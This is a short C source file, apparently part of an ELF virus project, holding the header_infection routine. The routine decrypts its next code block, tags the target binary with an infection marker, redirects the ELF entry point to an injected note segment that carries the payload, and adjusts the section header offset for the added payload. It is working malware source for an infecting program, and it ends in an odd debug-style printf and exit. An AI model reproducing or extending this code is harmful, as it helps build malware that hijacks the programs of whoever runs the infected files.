#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void header_infection(struct s_host *host, struct s_keychain *keychain)
{
	decrypt_right(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);

	*(unsigned int *)&host->header->e_ident[EI_PAD] = INFECTED_MAGIC_NUMBER;

	host->old_entry = host->header->e_entry;
	host->header->e_entry = host->note->self->p_vaddr;
	host->new_entry = host->header->e_entry;

	host->header->e_shoff += PAYLOAD_SIZE + (host->note->self->p_offset - (host->note->data->p_offset + host->note->data->p_filesz));

	printf("Ok\n");
	exit(0);
}
